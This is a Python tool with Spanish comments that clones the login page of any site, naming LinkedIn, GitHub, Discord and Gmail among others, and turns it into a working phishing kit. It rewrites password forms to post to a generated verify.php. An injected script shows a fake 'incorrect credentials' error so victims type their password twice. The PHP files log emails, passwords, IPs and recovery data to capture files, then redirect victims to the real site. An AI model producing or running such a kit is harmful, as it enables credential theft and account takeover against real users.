#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CLONADOR UNIVERSAL - Versión Final Corregida
Funciona con CUALQUIER página: LinkedIn, GitHub, Discord, Twitter, etc.
"""

import os
import sys
import time
import argparse
import requests
from pathlib import Path
from urllib.parse import urljoin, urlparse

# ===== AUTO-ACTIVACIÓN DE VENV =====
SCRIPT_DIR = Path(__file__).parent.parent.absolute()
VENV_PYTHON = SCRIPT_DIR / 'venv' / 'bin' / 'python'

if VENV_PYTHON.exists() and sys.prefix == sys.base_prefix:
    os.execv(str(VENV_PYTHON), [str(VENV_PYTHON)] + sys.argv)

# ===== IMPORTACIONES (AHORA CON VENV ACTIVO) =====
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from bs4 import BeautifulSoup

# Colores para terminal
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    COLORAMA = True
except:
    COLORAMA = False
    class Fore:
        GREEN = CYAN = YELLOW = RED = WHITE = ''
        RESET = ''
    class Style:
        RESET_ALL = ''


class UniversalCloner:
    """Clonador universal que funciona con cualquier sitio"""
    
    def __init__(self, url, name, output):
        self.url = url
        self.name = name.lower().replace(' ', '_')
        self.output = Path(output)
        self.base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        
        print(f"{Fore.CYAN}[*] Iniciando Chrome...{Style.RESET_ALL}")
        options = Options()
        options.add_argument('--headless=new')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        
        service = Service(ChromeDriverManager().install())
        self.driver = webdriver.Chrome(service=service, options=options)
        self.driver.set_page_load_timeout(30)
    
    def run(self):
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🔄 Clonando: {self.url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        self.output.mkdir(parents=True, exist_ok=True)
        
        # 1. Cargar página
        print(f"{Fore.WHITE}📥 Cargando página...{Style.RESET_ALL}")
        self.driver.get(self.url)
        
        # 2. Esperar carga completa
        print(f"{Fore.WHITE}⏳ Esperando renderizado de JavaScript...{Style.RESET_ALL}")
        try:
            WebDriverWait(self.driver, 15).until(
                EC.presence_of_element_located((By.TAG_NAME, "form"))
            )
        except:
            pass
        time.sleep(3)
        
        # 3. Scroll para lazy loading
        print(f"{Fore.WHITE}📜 Cargando contenido dinámico...{Style.RESET_ALL}")
        for _ in range(3):
            self.driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
            time.sleep(1)
        
        # 4. Obtener HTML renderizado
        html = self.driver.page_source
        soup = BeautifulSoup(html, 'html.parser')
        
        # 5. Descargar imágenes
        print(f"{Fore.WHITE}🖼️  Descargando imágenes...{Style.RESET_ALL}")
        assets_dir = self.output / 'assets'
        assets_dir.mkdir(exist_ok=True)
        
        downloaded = 0
        for img in soup.find_all('img'):
            src = img.get('src') or img.get('data-src') or img.get('data-original')
            if src and not src.startswith('data:'):
                try:
                    if src.startswith('//'):
                        src = 'https:' + src
                    elif src.startswith('/'):
                        src = self.base_url + src
                    
                    response = self.session.get(src, timeout=5)
                    if response.status_code == 200:
                        ext = src.split('.')[-1].split('?')[0]
                        if ext not in ['png', 'jpg', 'jpeg', 'gif', 'svg', 'ico', 'webp']:
                            ext = 'png'
                        img_name = f"img_{hash(src) % 100000}.{ext}"
                        img_path = assets_dir / img_name
                        img_path.write_bytes(response.content)
                        img['src'] = f'assets/{img_name}'
                        downloaded += 1
                        print(f"   {Fore.GREEN}✅{Style.RESET_ALL} {img_name}")
                except:
                    pass
        
        print(f"{Fore.GREEN}[✓] {downloaded} imágenes descargadas{Style.RESET_ALL}")
        
        # 6. Modificar formulario
        print(f"{Fore.WHITE}📝 Modificando formulario...{Style.RESET_ALL}")
        form_modified = False
        for form in soup.find_all('form'):
            if form.find('input', {'type': 'password'}):
                form['action'] = 'verify.php'
                form['method'] = 'POST'
                
                # CORRECCIÓN: new_tag con attrs=
                platform_input = soup.new_tag('input', attrs={
                    'type': 'hidden',
                    'name': 'platform',
                    'value': self.name
                })
                form.insert(0, platform_input)
                
                attempt_input = soup.new_tag('input', attrs={
                    'type': 'hidden',
                    'name': 'attempt',
                    'id': 'attemptInput',
                    'value': '1'
                })
                form.insert(0, attempt_input)
                form_modified = True
                print(f"{Fore.GREEN}[✓] Formulario modificado{Style.RESET_ALL}")
                break
        
        if not form_modified:
            print(f"{Fore.YELLOW}[!] No se encontró formulario con contraseña{Style.RESET_ALL}")
        
        # 7. Añadir script de validación
        validation_script = '''
<script>
(function() {
    var urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('error') === '1') {
        var attempt = document.getElementById('attemptInput');
        if (attempt) attempt.value = '2';
        var email = urlParams.get('email');
        if (email) {
            var inputs = document.querySelectorAll('input[type="text"], input[type="email"]');
            for (var i = 0; i < inputs.length; i++) inputs[i].value = decodeURIComponent(email);
        }
        var errorDiv = document.createElement('div');
        errorDiv.style.cssText = 'background:#fee;border:1px solid #fcc;border-radius:8px;padding:12px;margin:20px 0;color:#c00;text-align:center;';
        errorDiv.innerHTML = '⚠️ Credenciales incorrectas. Inténtalo de nuevo.';
        var form = document.querySelector('form');
        if (form) form.insertBefore(errorDiv, form.firstChild);
    }
    var form = document.querySelector('form');
    if (form) {
        form.addEventListener('submit', function(e) {
            var attempt = document.getElementById('attemptInput');
            if (attempt && attempt.value === '1') {
                e.preventDefault();
                var emailInput = document.querySelector('input[type="text"], input[type="email"]');
                if (emailInput) sessionStorage.setItem('clone_email', emailInput.value);
                var btn = form.querySelector('button[type="submit"]');
                if (btn) { btn.innerHTML = 'Verificando...'; btn.disabled = true; }
                setTimeout(function() {
                    var email = emailInput ? encodeURIComponent(emailInput.value) : '';
                    window.location.href = 'index.html?error=1&email=' + email;
                }, 2000);
            }
        });
    }
})();
</script>
'''
        
        html = str(soup)
        if '</body>' in html:
            html = html.replace('</body>', validation_script + '\n</body>')
        else:
            html += validation_script
        
        # 8. Guardar index.html
        print(f"{Fore.WHITE}💾 Guardando index.html...{Style.RESET_ALL}")
        (self.output / 'index.html').write_text(html, encoding='utf-8')
        
        # 9. Crear verify.php
        print(f"{Fore.WHITE}📄 Creando verify.php...{Style.RESET_ALL}")
        code = self.name[:3].upper()
        php = f'''<?php
session_start();
$dir = '../../captures/{code}';
if(!file_exists($dir))mkdir($dir,0755,true);
$ip=$_SERVER['REMOTE_ADDR']??'Unknown';
if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))$ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];
$ua=$_SERVER['HTTP_USER_AGENT']??'Unknown';
$att=$_POST['attempt']??'1';
$email=$pass='';
foreach($_POST as $k=>$v){{
    if($k=='platform'||$k=='attempt')continue;
    if(stripos($k,'pass')!==false||stripos($k,'pwd')!==false)$pass=$v;
    elseif(stripos($k,'user')!==false||stripos($k,'email')!==false||stripos($k,'login')!==false)$email=$v;
}}
if(empty($email)&&isset($_POST['email']))$email=$_POST['email'];
if(empty($pass)&&isset($_POST['pass']))$pass=$_POST['pass'];
$file=$dir.'/{code}_'.date('Ymd_His')."_attempt$att.txt";
$content="PLATFORM:{self.name}\\nEMAIL:$email\\nPASSWORD:$pass\\nIP:$ip\\nUA:$ua\\n";
file_put_contents($file,$content,FILE_APPEND);
if($att=='1'){{
    $_SESSION['clone_email']=$email;
    $_SESSION['clone_pass1']=$pass;
    header('Location:index.html?error=1&email='.urlencode($email));
}}else{{
    if($pass===($_SESSION['clone_pass1']??'')){{
        file_put_contents($dir.'/CONFIRMED_SUMMARY.txt',"✅ $email | $pass | ".date('Y-m-d H:i:s')."\\n",FILE_APPEND);
    }}
    session_destroy();
    $urls=['linkedin'=>'https://linkedin.com','github'=>'https://github.com','discord'=>'https://discord.com','twitter'=>'https://x.com','x'=>'https://x.com','facebook'=>'https://facebook.com','instagram'=>'https://instagram.com','tiktok'=>'https://tiktok.com','gmail'=>'https://mail.google.com','netflix'=>'https://netflix.com','spotify'=>'https://spotify.com','twitch'=>'https://twitch.tv','reddit'=>'https://reddit.com'];
    $url=$urls['{self.name}']??'https://www.{self.name}.com';
    header('Location:'.$url);
}}
exit;
?>'''
        (self.output / 'verify.php').write_text(php, encoding='utf-8')
        
        # 10. Crear capture_recovery.php
        php_recovery = f'''<?php
$code='{code}';
$dir='../../captures/'.$code;
if(!file_exists($dir))mkdir($dir,0755,true);
$ip=$_SERVER['REMOTE_ADDR']??'Unknown';
$ua=$_SERVER['HTTP_USER_AGENT']??'Unknown';
$file=$dir.'/RECOVERY_'.date('Ymd_His').'.txt';
$content="RECOVERY DATA:\\n";
foreach($_POST as $k=>$v){{if($k!='platform')$content.="$k: $v\\n";}}
$content.="IP: $ip\\nUA: $ua\\n";
file_put_contents($file,$content);
file_put_contents($dir.'/RECOVERY_SUMMARY.txt',"✅ RECOVERY | ".($_POST['email']??'N/A')." | ".date('Y-m-d H:i:s')."\\n",FILE_APPEND);
header('Location:index.html');
exit;
?>'''
        (self.output / 'capture_recovery.php').write_text(php_recovery, encoding='utf-8')
        
        self.driver.quit()
        
        # Resumen final
        print(f"\n{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✅ ¡CLONACIÓN COMPLETADA!{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
        print(f"📍 Directorio: {self.output}")
        print(f"🖼️  Imágenes descargadas: {downloaded}")
        print(f"📄 Archivos creados: index.html, verify.php, capture_recovery.php")
        return True


def main():
    parser = argparse.ArgumentParser(description='Clonador Universal - Funciona con cualquier sitio')
    parser.add_argument('--url', required=True, help='URL de la página de login')
    parser.add_argument('--name', required=True, help='Nombre de la plataforma')
    parser.add_argument('--output', required=True, help='Directorio de salida')
    args = parser.parse_args()
    
    cloner = UniversalCloner(args.url, args.name, args.output)
    cloner.run()


if __name__ == '__main__':
    main()
